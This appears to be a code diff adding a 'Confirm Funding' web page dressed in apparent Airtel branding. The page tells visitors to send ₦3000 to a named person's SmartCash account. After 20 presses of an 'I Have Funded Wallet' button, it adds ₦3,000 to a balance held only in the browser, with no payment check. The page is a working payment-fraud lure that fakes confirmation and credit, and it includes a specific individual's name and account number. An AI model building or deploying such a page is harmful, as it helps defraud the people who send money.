@@ -1,0 +1,99 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirm Funding</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+      background-image: url('airtel-bg.png');
+      background-size: cover;
+      background-position: center;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid red;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .card {
+      background-color: rgba(255, 255, 255, 0.95);
+      border-radius: 16px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      max-width: 350px;
+      display: none;
+    }
+    .btn {
+      background-color: red;
+      color: #fff;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      margin-top: 20px;
+      font-size: 16px;
+    }
+    .success {
+      margin-top: 15px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader" id="loader"></div>
+  <div class="card" id="card">
+    <h3>Send ₦<span id="amount">3000</span> to:</h3>
+    <p><strong>EMMANUEL OKWUNNA</strong></p>
+    <p>SmartCash Payment Service Bank</p>
+    <p>812 489 0070</p>
+    <button class="btn" id="fundBtn">I Have Funded Wallet</button>
+    <p class="success" id="successMsg"></p>
+  </div>  <script>
+    const loader = document.getElementById('loader');
+    const card = document.getElementById('card');
+    const amountDisplay = document.getElementById('amount');
+    const fundBtn = document.getElementById('fundBtn');
+    const successMsg = document.getElementById('successMsg');
+
+    // Show loader, then display card after 2 seconds
+    setTimeout(() => {
+      loader.style.display = 'none';
+      card.style.display = 'block';
+      const amount = localStorage.getItem('fundAmount') || '3000';
+      amountDisplay.innerText = amount;
+    }, 2000);
+
+    let tapCount = parseInt(localStorage.getItem('tapCount') || '0');
+
+    fundBtn.onclick = () => {
+      tapCount++;
+      localStorage.setItem('tapCount', tapCount);
+
+      successMsg.innerText = `Thank you! Confirmation ${tapCount}/20`;
+
+      if (tapCount >= 20) {
+        let balance = parseInt(localStorage.getItem('user.balance') || '0');
+        balance += 3000;
+        localStorage.setItem('user.balance', balance);
+        successMsg.innerText = '₦3,000 successfully added to your balance!';
+        localStorage.setItem('tapCount', 0); // reset count
+      }
+    };
+  </script></body>
+</html>
